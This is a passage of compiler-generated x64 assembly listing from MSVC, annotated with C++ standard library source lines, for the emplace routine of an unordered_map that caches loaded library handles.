>,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >, COMDAT

; 586  :     conditional_t<_Multi, iterator, pair<iterator, bool>> emplace(_Valtys&&... _Vals) {

$LN384:
	mov	QWORD PTR [rsp+8], rbx
	push	rbp
	push	rsi
	push	rdi
	push	r12
	push	r13
	push	r14
	push	r15
	sub	rsp, 64					; 00000040H
	mov	rbx, r8
	mov	r12, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1125 :     _CONSTEXPR20 explicit _Alloc_construct_ptr(_Alloc& _Al_) : _Al(_Al_), _Ptr(nullptr) {}

	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	mov	QWORD PTR _Newnode$3[rsp], rax

; 1132 :         _Ptr = nullptr; // if allocate throws, prevents double-free

	xor	ebp, ebp
	mov	QWORD PTR _Newnode$3[rsp+8], rbp

; 1133 :         _Ptr = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new
	mov	r14, rax
	mov	QWORD PTR _Newnode$3[rsp+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 276  :         : first(_STD forward<_Other1>(_Right.first)), second(_STD forward<_Other2>(_Right.second)) {}

	mov	rdx, QWORD PTR [rbx]
	lea	rcx, QWORD PTR [rax+16]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [r14+48], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r8, QWORD PTR [r14+32]

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rdx, QWORD PTR [r14+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [r14+40], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN369@emplace

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [r14+16]
$LN369@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rdi, -3750763034362895579		; cbf29ce484222325H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	rcx, rbp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r8, r8
	je	SHORT $LN73@emplace
	mov	r9, 1099511628211			; 00000100000001b3H
$LL365@emplace:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [rdx+rcx]
	xor	rdi, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rdi, r9

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rcx
	cmp	rcx, r8
	jb	SHORT $LL365@emplace
$LN73@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 622  :             auto _Target        = _Find_last(_Keyval, _Hashval);

	mov	r9, rdi
	lea	r8, QWORD PTR [r14+16]
	lea	rdx, QWORD PTR _Target$2[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >

; 623  :             if (_Target._Duplicate) {

	mov	rax, QWORD PTR _Target$2[rsp+8]
	test	rax, rax
	je	SHORT $LN2@emplace
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 247  :         : first(_STD forward<_Other1>(_Val1)), second(_STD forward<_Other2>(_Val2)) {

	mov	QWORD PTR [r12], rax
	mov	BYTE PTR [r12+8], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 589  :         if (this->_Ptr != pointer{}) {

	test	r14, r14
	je	$LN160@emplace
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [r14+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN129@emplace

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [r14+16]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN143@emplace

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN140@emplace

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN143@emplace:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN129@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [r14+32], rbp

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [r14+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [r14+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	edx, 56					; 00000038H
	mov	rcx, r14
	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 624  :                 return {_List._Make_iter(_Target._Duplicate), false};

	jmp	$LN160@emplace
$LN2@emplace:

; 1644 :         if (_Oldsize == _List.max_size()) {

	mov	rax, 329406144173384850			; 0492492492492492H
	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16
	cmp	rdx, rax
	je	$LN382@emplace

; 1651 :         const auto _Newsize      = _Oldsize + 1;

	lea	rcx, QWORD PTR [rdx+1]

; 1652 :         return max_load_factor() < static_cast<float>(_Newsize) / static_cast<float>(bucket_count());

	xorps	xmm0, xmm0
	test	rcx, rcx
	js	SHORT $LN377@emplace
	cvtsi2ss xmm0, rcx
	jmp	SHORT $LN378@emplace
$LN377@emplace:
	mov	rax, rcx
	shr	rax, 1
	and	ecx, 1
	or	rax, rcx
	cvtsi2ss xmm0, rax
	addss	xmm0, xmm0
$LN378@emplace:
	mov	rbx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56
	xorps	xmm2, xmm2
	test	rbx, rbx
	js	SHORT $LN375@emplace
	cvtsi2ss xmm2, rbx
	jmp	SHORT $LN376@emplace
$LN375@emplace:
	mov	rcx, rbx
	shr	rcx, 1
	mov	rax, rbx
	and	eax, 1
	or	rcx, rax
	cvtsi2ss xmm2, rcx
	addss	xmm2, xmm2
$LN376@emplace:
	movaps	xmm1, xmm0
	divss	xmm1, xmm2
	movss	xmm3, DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	comiss	xmm1, xmm3

; 625  :             }
; 626  : 
; 627  :             _Check_max_size();
; 628  :             if (_Check_rehash_required_1()) {

	jbe	$LN3@emplace

; 1681 :         return static_cast<size_type>(_CSTD ceilf(static_cast<float>(_For_size) / max_load_factor()));

	divss	xmm0, xmm3
	call	ceilf
	xor	ecx, ecx
	movss	xmm1, DWORD PTR __real@5f000000
	comiss	xmm0, xmm1
	jb	SHORT $LN374@emplace
	subss	xmm0, xmm1
	comiss	xmm0, xmm1
	jae	SHORT $LN374@emplace
	mov	rax, -9223372036854775808		; 8000000000000000H
	mov	rcx, rax
$LN374@emplace:
	cvttss2si rax, xmm0
	add	rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	mov	ecx, 8
	cmp	rax, rcx
	cmova	rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1687 :         if (_Old_buckets >= _Req_buckets) {

	cmp	rbx, rcx
	jae	SHORT $LN304@emplace

; 1688 :             // we already have enough buckets so there's no need to change the count
; 1689 :             return _Old_buckets;
; 1690 :         }
; 1691 : 
; 1692 :         if (_Old_buckets < 512 && _Old_buckets * 8 >= _Req_buckets) {

	cmp	rbx, 512				; 00000200H
	jae	SHORT $LN306@emplace
	lea	rbx, QWORD PTR [rbx*8]
	cmp	rbx, rcx
	jae	SHORT $LN304@emplace
$LN306@emplace:

; 1693 :             // if we are changing the bucket count and have less than 512 buckets, use 8x more buckets
; 1694 :             return _Old_buckets * 8;
; 1695 :         }
; 1696 : 
; 1697 :         // power of 2 invariant means this will result in at least 2*_Old_buckets after round up in _Forced_rehash
; 1698 :         return _Req_buckets;

	mov	rbx, rcx
$LN304@emplace:

; 1658 :         _Forced_rehash(_Desired_grow_bucket_count(_Newsize));

	mov	rdx, rbx
	call	?_Forced_rehash@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAX_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Forced_rehash

; 1564 :         const size_type _Bucket = _Hashval & _Mask;

	mov	rax, rdi
	and	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1565 :         _Nodeptr _Where         = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;

	add	rax, rax
	mov	r15, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	mov	rbx, QWORD PTR [r15+rax*8+8]

; 1566 :         const _Nodeptr _End     = _List._Mypair._Myval2._Myhead;
; 1567 :         if (_Where == _End) {

	mov	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	cmp	rbx, rcx
	jne	SHORT $LN322@emplace

; 1568 :             return {_End, _Nodeptr{}};

	mov	QWORD PTR $T1[rsp], rcx
	mov	QWORD PTR $T1[rsp+8], rbp
	jmp	SHORT $LN320@emplace
$LN322@emplace:

; 1569 :         }
; 1570 : 
; 1571 :         const _Nodeptr _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	r15, QWORD PTR [r15+rax*8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r13, QWORD PTR [r14+40]

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rbp, QWORD PTR [r14+32]
	npad	2
$LL319@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1574 :             if (!_Traitsobj(_Keyval, _Traits::_Kfn(_Where->_Myval))) {

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN339@emplace

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN339@emplace:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR [r14+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN346@emplace

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rcx, QWORD PTR [r14+16]
$LN346@emplace:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rbp, rax
	jne	SHORT $LN354@emplace

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rbp
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN362@emplace
$LN354@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1584 :             if (_Where == _Bucket_lo) {

	cmp	rbx, r15
	je	SHORT $LN363@emplace

; 1586 :             }
; 1587 : 
; 1588 :             _Where = _Where->_Prev;

	mov	rbx, QWORD PTR [rbx+8]

; 1589 :         }

	jmp	SHORT $LL319@emplace
$LN362@emplace:

; 1575 :                 if constexpr (!_Traits::_Standard) {
; 1576 :                     if (_Traitsobj(_Traits::_Kfn(_Where->_Myval), _Keyval)) {
; 1577 :                         return {_Where->_Next, _Nodeptr{}};
; 1578 :                     }
; 1579 :                 }
; 1580 : 
; 1581 :                 return {_Where->_Next, _Where};

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR $T1[rsp], rax
	mov	QWORD PTR $T1[rsp+8], rbx
	jmp	SHORT $LN320@emplace
$LN363@emplace:

; 1585 :                 return {_Where, _Nodeptr{}};

	mov	QWORD PTR $T1[rsp], rbx
	mov	QWORD PTR $T1[rsp+8], 0
$LN320@emplace:

; 629  :                 _Rehash_for_1();
; 630  :                 _Target = _Find_last(_Traits::_Kfn(_Newnode._Ptr->_Myval), _Hashval);

	movaps	xmm0, XMMWORD PTR $T1[rsp]
	movdqa	XMMWORD PTR _Target$2[rsp], xmm0
	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16
$LN3@emplace:

; 1612 :         const _Nodeptr _Insert_after = _Insert_before->_Prev;

	mov	rcx, QWORD PTR _Target$2[rsp]
	mov	r8, QWORD PTR [rcx+8]

; 1613 :         ++_List._Mypair._Myval2._Mysize;

	inc	rdx
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16, rdx

; 1614 :         _Construct_in_place(_Newnode->_Next, _Insert_before);

	mov	QWORD PTR [r14], rcx

; 1615 :         _Construct_in_place(_Newnode->_Prev, _Insert_after);

	mov	QWORD PTR [r14+8], r8

; 1616 :         _Insert_after->_Next  = _Newnode;

	mov	QWORD PTR [r8], r14

; 1617 :         _Insert_before->_Prev = _Newnode;

	mov	QWORD PTR [rcx+8], r14

; 1618 : 
; 1619 :         const auto _Head                = _List._Mypair._Myval2._Myhead;
; 1620 :         const auto _Bucket_array        = _Vec._Mypair._Myval2._Myfirst;
; 1621 :         const size_type _Bucket         = _Hashval & _Mask;

	and	rdi, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1622 :         _Unchecked_iterator& _Bucket_lo = _Bucket_array[_Bucket << 1];

	add	rdi, rdi
	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24

; 1623 :         _Unchecked_iterator& _Bucket_hi = _Bucket_array[(_Bucket << 1) + 1];
; 1624 :         if (_Bucket_lo._Ptr == _Head) {

	mov	rdx, QWORD PTR [rax+rdi*8]
	cmp	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	jne	SHORT $LN194@emplace

; 1625 :             // bucket is empty, set both
; 1626 :             _Bucket_lo._Ptr = _Newnode;

	mov	QWORD PTR [rax+rdi*8], r14

; 1627 :             _Bucket_hi._Ptr = _Newnode;

	jmp	SHORT $LN380@emplace
$LN194@emplace:

; 1628 :         } else if (_Bucket_lo._Ptr == _Insert_before) {

	cmp	rdx, rcx
	jne	SHORT $LN196@emplace

; 1629 :             // new node is the lowest element in the bucket
; 1630 :             _Bucket_lo._Ptr = _Newnode;

	mov	QWORD PTR [rax+rdi*8], r14
	jmp	SHORT $LN198@emplace
$LN196@emplace:

; 1631 :         } else if (_Bucket_hi._Ptr == _Insert_after) {

	cmp	QWORD PTR [rax+rdi*8+8], r8
	jne	SHORT $LN198@emplace
$LN380@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 247  :         : first(_STD forward<_Other1>(_Val1)), second(_STD forward<_Other2>(_Val2)) {

	mov	QWORD PTR [rax+rdi*8+8], r14
$LN198@emplace:
	mov	QWORD PTR [r12], r14
	mov	BYTE PTR [r12+8], 1
$LN160@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 636  :     }

	mov	rax, r12
	mov	rbx, QWORD PTR [rsp+128]
	add	rsp, 64					; 00000040H
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rdi
	pop	rsi
	pop	rbp
	ret	0
$LN382@emplace:

; 1645 :             _Xlength_error("unordered_map/set too long");

	lea	rcx, OFFSET FLAT:??_C@_0BL@GOIGLPKN@unordered_map?1set?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
	npad	1
$LN140@emplace:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN379@emplace:
??$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
_Target$2 = 32
_Newnode$3 = 48
this$dead$ = 128
__$ReturnUdt$ = 136
<_Vals_0>$ = 144
